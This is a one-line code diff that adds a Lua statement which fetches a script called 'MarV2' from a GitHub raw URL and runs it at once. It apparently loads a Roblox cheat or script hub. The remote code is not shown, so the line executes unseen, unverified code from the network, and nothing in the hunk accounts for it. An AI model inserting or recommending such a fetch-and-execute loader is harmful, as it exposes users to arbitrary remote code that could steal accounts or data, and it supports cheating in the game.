@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/tools/refs/heads/main/loader/MarV2"))()
